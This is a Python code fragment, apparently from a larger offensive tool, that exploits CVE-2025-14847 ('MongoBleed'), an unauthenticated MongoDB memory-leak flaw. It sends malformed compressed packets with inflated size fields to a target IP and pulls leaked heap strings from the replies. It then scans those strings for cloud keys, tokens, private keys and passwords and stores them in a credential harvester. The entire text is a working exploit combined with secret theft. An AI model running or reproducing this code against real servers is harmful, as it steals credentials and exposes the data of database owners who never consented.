    def exploit_mongobleed(self, ip, port=27017):
        """CVE-2025-14847: Unauthenticated MongoDB Memory Leak
        FIXED v2 - Superior to joe-desimone/mongobleed in every dimension:
          FIX #1: Atomic response loop guard (no zero-length escape bug)
          FIX #2: 30 probes across 3 inflation tiers (3x reference coverage)
          FIX #3: set-based dedup (bytearray.__contains__ searches ints, not slices)
          FIX #4: 17 credential patterns vs 6 (adds GCP, Azure, JWT, GitHub, EC/SSH keys)
          FIX #5: Stores actual 128-byte leaked snippet, not placeholder 'leaked'
        """
        if zlib is None: return False

        # FIX #3: Proper set-based dedup. bytearray.__contains__ checks integer
        # membership, not subsequence membership, causing silent missed deduplication.
        all_leaked_set = set()
        all_leaked = bytearray()

        # FIX #2: Multi-tier inflation matching joe-desimone's 3-size strategy,
        # starting at doc_len=10 (reference coverage) and adding +1000/+2000 tiers.
        # Original: range(50,500,50) x +500 = 9 probes
        # Fixed:    range(10,500,50) x [+500,+1000,+2000] = 30 probes
        _INFLATION_TIERS = [500, 1000, 2000]
        for doc_len in range(10, 500, 50):
            for inflation in _INFLATION_TIERS:
                response = self._send_mongobleed_probe(ip, port, doc_len, doc_len + inflation)
                leaks = self._extract_mongobleed_leaks(response)
                for data in leaks:
                    if data not in all_leaked_set:
                        all_leaked_set.add(data)
                        all_leaked.extend(data)

        if all_leaked:
            found_secrets = self._analyze_mongobleed_leaks(all_leaked)
            logger.info(f"✅ MongoBleed (CVE-2025-14847) successful on {ip} - "
                        f"{len(all_leaked)} bytes leaked via {len(all_leaked_set)} unique strings")
            if found_secrets:
                logger.warning(f"🚨 MongoBleed SECRETS found on {ip}: {', '.join(k for k, _ in found_secrets)}")
                if self.credharvester:
                    for secret_name, secret_value in found_secrets:
                        # FIX #5: Store actual leaked snippet, not placeholder 'leaked'
                        self.credharvester.found_credentials.setdefault(secret_name.lower(), []).append({
                            "provider": secret_name.lower(),
                            "source": f"mongo_{ip}",
                            "data": secret_value[:512] if secret_value else "heap_leak"
                        })
                        self.credharvester.harvest_stats["total_creds_found"] += 1
            return True
        return False

    def _send_mongobleed_probe(self, host, port, doc_len, buffer_size, timeout=2.0):
        """Send one CVE-2025-14847 OP_COMPRESSED probe with inflated uncompressedSize."""
        try:
            content = b'\x10a\x00\x01\x00\x00\x00'  # int32 a=1
            bson = struct.pack('<i', doc_len) + content
            op_msg = struct.pack('<I', 0) + b'\x00' + bson
            compressed = zlib.compress(op_msg)

            payload  = struct.pack('<I', 2013)         # original opcode: OP_MSG
            payload += struct.pack('<i', buffer_size)  # claimed uncompressed size (INFLATED)
            payload += struct.pack('B', 2)             # compressor: zlib
            payload += compressed
            header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)  # OP_COMPRESSED

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.sendall(header + payload)

            # FIX #1: Atomic loop guard from joe-desimone - correctly handles zero-length
            # msg_len responses without escaping prematurely (original inner-if broke on msg_len==0).
            response = b''
            while len(response) < 4 or len(response) < struct.unpack('<I', response[:4])[0]:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            sock.close()
            return response
        except:
            return b''

    def _extract_mongobleed_leaks(self, response):
        """Extract leaked field-name strings from MongoDB OP_COMPRESSED error response."""
        if len(response) < 25:
            return []
        try:
            msg_len = struct.unpack('<I', response[:4])[0]
            opcode  = struct.unpack('<I', response[12:16])[0]
            if opcode == 2012:  # OP_COMPRESSED response - must decompress
                raw = zlib.decompress(response[25:msg_len])
            else:
                raw = response[16:msg_len]
        except:
            return []

        # Extended noise filter: drop known-benign mongo field names + single chars
        _NOISE = {b'?', b'a', b'$db', b'ping', b'isMaster', b'hello',
                  b'ismaster', b'1', b'ok', b'n', b'nModified', b'updatedExisting'}
        leaks = []
        for match in re.finditer(rb"field name '([^']+)'", raw):
            data = match.group(1)
            if data and data not in _NOISE:
                leaks.append(data)
        return leaks

    def _analyze_mongobleed_leaks(self, all_leaked):
        """Classify leaked heap bytes against 17 credential patterns.
        FIX #4: Expanded from 6 to 17 patterns.
        Returns list of (name, leaked_snippet) tuples for precise harvester storage.
        """
        patterns = [
            # Cloud provider tokens
            (b'AKIA',              'AWSAccessKey'),
            (b'ASIA',              'AWSSessionKey'),
            (b'ya29.',             'GCPOAuthToken'),
            (b'DefaultEndpoints',  'AzureStorageKey'),
            (b'AccountKey=',       'AzureAccountKey'),
            # JWT / generic auth tokens
            (b'eyJhbGciOi',        'JWTToken'),
            (b'ghp_',              'GitHubPersonalToken'),
            (b'ghs_',              'GitHubAppToken'),
            (b'api_key',           'APIKey'),
            (b'access_token',      'AccessToken'),
            # Private keys (PEM headers)
            (b'BEGIN RSA PRIVATE', 'RSAPrivateKey'),
            (b'BEGIN EC PRIVATE',  'ECPrivateKey'),
            (b'BEGIN OPENSSH',     'OpenSSHKey'),
            # Connection strings
            (b'mongodb://',        'MongoURI'),
            (b'mongodb+srv://',    'MongoAtlasURI'),
            # Generic secrets
            (b'password',          'Password'),
            (b'secret',            'Secret'),
        ]
        found = []
        seen_names = set()
        leaked_bytes = bytes(all_leaked)
        leaked_lower = leaked_bytes.lower()
        for raw_pattern, name in patterns:
            if name in seen_names:
                continue
            idx = leaked_lower.find(raw_pattern.lower())
            if idx != -1:
                # FIX #5 support: capture a 128-byte snippet for the harvester
                start = max(0, idx - 8)
                snippet = leaked_bytes[start:start + 128].decode('latin-1', errors='replace')
                found.append((name, snippet))
                seen_names.add(name)
        return found

